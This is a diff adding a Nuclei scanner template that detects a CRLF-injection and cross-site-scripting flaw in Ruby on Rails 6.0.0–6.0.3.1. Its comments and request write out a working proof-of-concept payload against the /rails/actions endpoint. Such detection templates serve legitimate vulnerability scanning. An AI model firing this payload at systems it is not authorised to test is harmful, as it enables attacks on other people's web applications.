@@ -1,0 +1,41 @@
+id: rails6-xss
+
+#  XSS (6.0.0 - 6.0.3.1); Payload is location=%0djavascript:alert(1);
+#  Nuclei has issues with 302 response missing a Location header thus the
+#  extended payload to make Nuclei work.
+#  Working poc by @Mad-robot
+# /rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0Djavascript%3Aalert%28document.domain%29
+info:
+  name: Ruby on Rails - CRLF Injection and Cross-Site Scripting
+  author: ooooooo_q,rootxharsh,iamnoooob
+  severity: medium
+  description: Ruby on Rails 6.0.0-6.0.3.1 contains a CRLF issue which allows JavaScript to be injected into the response, resulting in cross-site scripting.
+  reference:
+    - https://hackerone.com/reports/904059
+  metadata:
+    max-request: 1
+  tags: rails,xss,crlf,hackerone
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'javascript:alert(1)'
+        part: body
+
+      - type: status
+        status:
+          - 302
+
+      - type: word
+        words:
+          - 'Location: aaaaa'
+          - 'text/html'
+        part: header
+        condition: and
+# digest: 4a0a004730450220544574de254179bb4193d4b62b4999f5c982c48f8c91c3a0f9c928851ac84730022100d9184ce4a28a8240ff5a1b9068e126e81f9bccc837a33ca483621e1e82e55f41:922c64590222798bb761d5b6d8e72950
